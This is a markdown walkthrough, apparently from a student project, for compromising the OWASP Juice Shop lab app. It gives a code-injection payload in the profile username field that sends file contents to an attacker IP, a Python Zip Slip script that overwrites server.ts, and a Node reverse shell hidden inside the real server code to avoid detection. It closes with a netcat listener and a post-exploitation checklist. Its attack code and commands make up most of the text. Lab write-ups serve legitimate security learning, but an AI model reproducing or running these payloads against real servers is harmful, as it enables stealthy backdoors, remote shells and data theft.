# Server-side Attack

This is a guide on how to get a reverse shell on the server hosting the juice shop website based on the **Zip Slip** vulnerability to write arbitrary files, in this case, to write the server code file.

## How to attack the server

### Part 1 - Server files exploration

* To successfully attack the server without detection, it's crucial to discreetly alter specific files. We need to understand which files to modify and their contents, allowing us to hide our exploit effectively and make it difficult to discover.
* During our project, we identified numerous vulnerabilities on the website, with a particularly significant one in the profile's username field. This vulnerability allows us to execute code on the server machine. Using this, we can run a command to list all directory contents ("ls") and send the output to a listening service.

So, changing the username of a user in (`{SERVER_IP}:{PORT}/profile`) to :

```javascript
const { exec } = require('child_process'); const net = require('net'); exec('cat server.ts', (err, stdout,stderr) => { const client = new net.Socket();client.connect(4444, 'IP_ADDRESS', () => {client.write(stdout);client.end();});});

```

where the IP_ADDRESS is the ip of the attacker.

* Using this strategy, we will eventually discover that the server code resides in **server.ts**. By executing a similar command ("cat server.ts"), we can reveal its contents.

* With further exploration, we can determine that every file submitted in the complaints to the website is stored in the 'uploads/complaints' directory.

### Part 2 - The attack

* With the knowledge obtained in the part 1, we can now attack the server.
* Now, we create a file called **server.ts** that contains the same code as the original server file and the actual exploit carefully hidden in the middle of the real code like this:

```javascript
(real code)

/* Exploit */
let net = require("net")
let cp = require("child_process")
let sh =  cp.spawn("/bin/sh", []);
let cl = new net.Socket();
cl.connect(4444, "IP_ADDRESS", function(){ cl.pipe(sh.stdin); sh.stdout.pipe(cl); sh.stderr.pipe(cl); });


(real code)

```

where the IP_ADDRESS is the ip of the attacker.

* After creating the malicious server code file, we can put it inside a zip file, with this structure: '../../server.ts'
* This way, we go to the actual directory where the real server file is located and we can rewrite it.

```python

import zipfile
PATH = "../../"

def main():
    zf = zipfile.ZipFile("evil.zip", "w")
    zf.write("server.ts", PATH + "server.ts")
    zf.close()
if __name__ == '__main__':
    main()


```

* Now, we just submit the zip file in the complaints page (`{SERVER_IP}:{PORT}/#/complain`)
* We can open a terminal listening to the port defined: `nc -lnvp 4444`
* After submitting, we need to wait until the server restarts.
* Once it restart, we will get a shell on the server machine.

### Part 3 - Exploration and Privilege Escalation

Once inside, there are a lot of things we can do:

* Enumerate user accounts and their privileges.
* Investigate running processes for potential vulnerabilities or misconfigurations.
* Search for configuration files that may contain sensitive information or credentials.
* Search for open ports and services to identify potential attack vectors.
* Inspect system logs for any unusual or suspicious activities.
* Utilize known exploits or vulnerabilities specific to the operating system or installed software.
* Attempt to escalate privileges using kernel exploits if applicable.
* Conduct a thorough review of cron jobs and scheduled tasks for any opportunities.
* Explore network shares and mounted filesystems for additional data or access points.
